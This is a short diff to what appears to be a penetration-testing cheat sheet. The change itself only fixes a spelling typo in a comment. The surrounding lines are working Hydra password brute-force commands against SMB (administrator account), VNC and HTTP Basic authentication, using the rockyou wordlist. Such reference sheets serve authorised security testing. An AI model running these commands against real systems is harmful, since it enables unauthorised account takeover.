@@ -29,7 +29,7 @@ hydra -t 1 -V -f -l administrator -P rockyou.txt $ip smb 		# Hydra brute force S
 # redis, adam6500, cisco, oracle-listener, s7-300, snmp and vnc modules are only using the -p or -P option, not login (-l, -L) or colon file (-C)
 hydra -P /usr/share/wordlists/rockyou.txt vnc://$ip
 
-# Hydra HTTP Basic Authenication Brute Force
+# Hydra HTTP Basic Authentication Brute Force
 hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip -s $port -f http-get / 
 
 # Hydra brute force a Wordpress admin login
